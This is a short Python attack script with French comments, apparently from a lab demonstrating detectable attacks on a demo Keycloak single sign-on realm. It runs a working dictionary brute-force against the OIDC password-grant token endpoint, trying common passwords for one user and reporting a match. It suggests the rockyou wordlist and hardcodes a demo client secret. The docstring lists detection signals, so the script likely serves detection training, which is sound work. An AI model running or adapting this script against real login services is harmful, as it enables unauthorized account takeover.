"""
Attaque 1 : BRUTE FORCE par dictionnaire
=========================================
Cible : un seul utilisateur, on essaie plein de mots de passe.
Lance depuis Windows (ou n'importe où) :
    python brute_force.py http://<ip-ubuntu>:8080 alice

Détectable par :
  - taux d'échec très élevé sur 1 seul username
  - cadence rapide
  - tentatives répétées depuis la même IP
"""
import sys
import time
import requests

KEYCLOAK_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
TARGET_USER  = sys.argv[2] if len(sys.argv) > 2 else "alice"
REALM        = "sso-demo"
CLIENT_ID    = "ticket-app"
CLIENT_SECRET= "ticket-app-secret"

# Mini wordlist (en vrai : utiliser rockyou.txt)
PASSWORDS = [
    "123456", "password", "admin", "qwerty", "azerty", "letmein",
    "welcome", "1234", "12345", "iloveyou", "monkey", "dragon",
    "football", "baseball", "master", "shadow", "abc123", "111111",
    "alice", "alice123", "Alice2024", "P@ssw0rd",
]

def try_login(username, password):
    """Tente un login OIDC password grant."""
    url = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/token"
    data = {
        "grant_type":   "password",
        "client_id":    CLIENT_ID,
        "client_secret":CLIENT_SECRET,
        "username":     username,
        "password":     password,
    }
    try:
        r = requests.post(url, data=data, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print(f"  ! erreur réseau : {e}")
        return False


print(f"[*] Brute force sur {TARGET_USER} via {KEYCLOAK_URL}")
print(f"[*] {len(PASSWORDS)} mots de passe à tester\n")

for i, pwd in enumerate(PASSWORDS, 1):
    success = try_login(TARGET_USER, pwd)
    status  = "✓ TROUVÉ" if success else "✗"
    print(f"  [{i:3d}/{len(PASSWORDS)}] {pwd:20s} -> {status}")
    if success:
        print(f"\n[!] MOT DE PASSE TROUVÉ : {pwd}")
        break
    time.sleep(0.1)  # cadence rapide pour être détecté
else:
    print("\n[*] Aucun mot de passe trouvé.")
